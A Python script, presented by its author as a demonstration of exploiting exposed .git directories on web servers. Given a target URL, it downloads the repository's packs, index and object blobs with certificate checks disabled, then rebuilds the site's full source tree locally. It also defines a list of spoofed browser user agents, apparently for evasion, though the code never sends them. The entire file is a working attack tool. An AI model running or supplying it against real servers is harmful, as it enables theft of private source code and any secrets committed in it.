#!/usr/local/bin/python3.6

# Quick and dirty demonstration of a git exposure exploitation by Walther Lee
# The author disclaims copyright to this source code.

import argparse
import os
import random
import re
import subprocess

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
parser = argparse.ArgumentParser(description='Download files from an exposed git repository in git-repo-url')
parser.add_argument('repo-url', type=str, help='url of the exposed .git folder')
parser.add_argument('-f --folder', metavar='path', type=str, help='folder to save downloaded repo')


def create_object(folder, filename, content):
    """
    create a git object blob
    """
    # create object folder
    folder_path = os.path.join(os.getcwd(), '.git', 'objects', folder)
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)

    # create object file
    file_path = os.path.join(folder_path, filename)
    if not os.path.exists(file_path):
        with open(file_path, 'wb') as f:
            f.write(content)


def create_file(project_path, path, content):
    """
    create a file from blob
    :param project_path: folder to store data
    :param path: relative path from project_path
    :param content: encoded content string
    """
    path_split = path.split('/')
    filename = path_split[-1]
    path = '/'.join(path_split[:-1]) if len(path_split) > 1 else ''
    folder_path = os.path.join(project_path, path)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    with open(os.path.join(folder_path, filename), 'wb') as f:
        f.write(content)


def decode_hash(git_url, b_hash):
    """
    download a blob by hash, store it and cat-file its content
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537\.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537\.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537\.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537\.36",
        "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537\.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537\.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537\.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537\.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537\.36",
    ]
    folder, obj = b_hash[:2], b_hash[2:]
    url = git_url + 'objects/' + folder + '/' + obj
    headers = {
        'User-Agent': random.choice(user_agents)
    }
    res = requests.get(url, verify=False)
    if res.status_code != 200:
        return

    create_object(folder, obj, res.content)
    return subprocess.run(['git', 'cat-file', '-p', b_hash], stdout=subprocess.PIPE).stdout
    

def unpack_hash(git_url, pack):
    """
    download, save and unpack .pack files from git repository
    """
    # download and save pack objects
    packs_path = os.path.join(os.getcwd(), '.git', 'objects', 'pack')
    if not os.path.exists(packs_path):
        os.makedirs(packs_path)

    for ext in ('.idx', '.pack'):
        filename = pack + ext
        filepath = os.path.join(packs_path, filename)
        # download packs only if doesn't exist already
        if not os.path.exists(filepath):
            print('Downloading pack=[%s]' % filename)
            res = requests.get(git_url + 'objects/pack/' + filename, verify=False)
            if res.status_code != 200:
                print('ERROR downloading pack=[%s]. status_code=[%d]' % (filename, res.status_code))
                return

            with open(filepath, 'wb') as f:
                f.write(res.content)

    ps = subprocess.Popen(('cat', filepath), stdout=subprocess.PIPE)
    command = 'git unpack-objects -r'
    subprocess.run(command.split(), stdin=ps.stdout)


def main(git_url, folder_path):
    # chdir to project folder
    if not folder_path:
        folder_path = ''

    save_path = os.path.join(os.getcwd(), folder_path)
    if not os.path.exists(save_path):
        os.mkdir(save_path)

    os.chdir(save_path)
    # create a new git project if doesn't exist
    if not os.path.exists(os.path.join(os.getcwd(), '.git')):
        subprocess.run(['git', 'init'])

    # download packed data
    res = requests.get(git_url + 'objects/info/packs', verify=False)
    if res.status_code != 200:
        print('ERROR: status_code=[%s] received downloading git packs' % res.status_code)

    else:
        packs = re.findall(r'(pack\-\w+)\.pack', res.text)
        for pack in packs:
            unpack_hash(git_url, pack)

    # download git index if doesn't exist
    index_path = os.path.join(os.getcwd(), '.git', 'index')
    if not os.path.exists(index_path):
        res = requests.get(git_url + 'index', verify=False)
        if not res.status_code == 200:
            raise IOError(200, 'ERROR: status_code=[%s] received downloading git index' % res.status_code)
        
        with open(index_path, 'wb') as f:
            f.write(res.content)

    # get blobs hashes
    index = subprocess.run(['git', 'ls-files', '--stage'], stdout=subprocess.PIPE).stdout.decode('ascii')
    hashes_paths = re.findall(r'([\w]{40})\s+\d+\s+([\w\/\.\-_#]+)', index)

    # download, decode and save files
    for blob, path in hashes_paths:
        content = decode_hash(git_url, blob)
        if not content:
            # search blob in unpacked files
            folder, filename = blob[:2], blob[2:]
            blob_path = os.path.join(os.getcwd(), '.git', 'objects', folder, filename)
            if not os.path.exists(blob_path):
                print('ERROR getting [%s] %s' % (blob, path))
                continue
            
            with open(blob_path, 'rb') as f:
                content = f.read()

        create_file(save_path, path, content)
        print('Created [%s] %s' % (blob, path))


if __name__ == '__main__':
    args = vars(parser.parse_args())
    if not args.get('repo-url'):
        print('You have to specify the url of the git repo')

    url = args.get('repo-url')
    if not re.match(r'https{0,1}:\/\/', url):
        url = 'http://' + url

    if url[-1] != '/':
        url = url + '/'
    
    main(url, args.get('f __folder'))
